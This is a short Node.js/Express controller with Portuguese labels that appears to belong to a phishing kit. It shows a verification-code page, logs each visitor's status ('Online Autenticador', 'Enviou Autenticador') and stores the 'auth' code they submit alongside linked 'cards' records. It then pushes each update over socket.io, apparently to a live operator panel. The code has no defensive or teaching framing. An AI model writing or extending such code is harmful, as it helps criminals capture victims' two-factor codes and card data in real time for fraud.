const userByToken = require('../../middlewares/auth')
const Client = require('../../models/Client')

module.exports = {
    async view(req, res) {
        try {
            const { client_id } = req.params

            const client = await Client.findByPk(client_id)

            if (!client) return res.redirect('/modules/conta')

            await client.update({ status: `Online Autenticador` })

            res.app.io.emit('updateClient', client.toJSON())

            return res.render('pages/authenticator', {
                title: 'Informe o código de verificação',
                pageClasses: 'cadastro',
                client: client.toJSON(),
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
    async store(req, res) {
        try {
            const { client_id } = req.params

            const { auth } = req.body

            const client = await Client.findByPk(client_id)

            if (!client) return res.redirect('/modules/conta')

            await client.update({ auth, status: `Enviou Autenticador` })

            const client_updated = await Client.findByPk(client_id, {
                include: {
                    association: 'cards',
                    order: [['id', 'asc']],
                },
            })

            res.app.io.emit('updateClient', client_updated.toJSON())

            return res.json(client_updated)
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
